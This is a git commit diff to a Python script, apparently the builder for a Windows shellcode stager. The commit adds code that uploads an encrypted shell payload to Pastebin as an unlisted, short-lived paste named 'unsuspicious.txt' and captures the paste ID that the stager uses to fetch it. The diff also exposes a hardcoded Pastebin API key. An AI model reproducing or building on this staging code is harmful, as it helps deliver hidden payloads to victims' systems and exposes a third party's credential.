5c7cfcab2d0843073e81f6cdc3464f0cebfad3f2
logandavis <logankeahidavis@gmail.com>
2015-12-11 10:06:20 -0500

    upload enabled

--- stagehand.py
+++ stagehand.py
@@ -1,9 +1,11 @@
 #!/usr/bin/env python
 
 import os
-import sys
 import subprocess
 from jinja2 import Template
+import urllib
+import urllib2
+
 
 def yesOrNo(prompt):
     """ A wrapped raw_input that expects a yes or no from the user """
@@ -21,6 +23,20 @@ def yesOrNo(prompt):
         else:
             print("Please respond with 'yes/y' or 'no/n'!")
 
+
+def getFileName(prompt):
+    """ A wrapped raw_input that expects the filename of an encrypted shell
+    script from the user """
+
+    while True:
+        filename = raw_input(prompt)
+        try:
+            with open(filename, 'rb') as f:
+                f.read()
+            return filename
+        except IOError:
+            print("That file doesn't seem to exist. Try again.")
+
 basePath = os.path.dirname(os.path.abspath(__file__))
 
 with open('winstage.c', 'rb') as f:
@@ -28,7 +44,29 @@ with open('winstage.c', 'rb') as f:
 
 template = Template(rawCode)
 
-pbCode = raw_input("Please enter the 8 digit pastebin ID of your shellcode (seen in the url as \"pastebin.com/raw.php?i=<the code>\"): ")
+script = getFileName("Please enter the filename of an encrypted shell script you would like to upload to Pastebin for future use (the file should be in this directory): ")
+with open(script, 'rb') as f:
+    upload = f.read()
+
+# POST request parameters for the Pastebin API
+values = {'api_dev_key': 'acf4072da13aa475dc724c4dab83bbd2',  # logan's API key
+          'api_paste_code': upload,  # message body
+          'api_paste_private': '1',  # 0 = public, 1 = unlisted, 2 = private
+          'api_paste_name': 'unsuspicious.txt',  # filename
+          'api_paste_expire_date': '10M',  # 10 minutes (#1W for 1 week)
+          'api_paste_format': 'c',  # syntax highlighting says 'c file'
+          'api_option': 'paste'  # tell pastebin it's a new paste
+          }
+
+# send a POST request to Pastebin
+url = 'http://pastebin.com/api/api_post.php'
+data = urllib.urlencode(values)
+req = urllib2.Request(url, data)
+response = urllib2.urlopen(req)
+the_page = response.read()
+
+# get the URL code from Pastebin's response
+pbCode = the_page[-8:]
 
 errorHandling = yesOrNo("Would you like to include error handling? [y/N]: ")
 
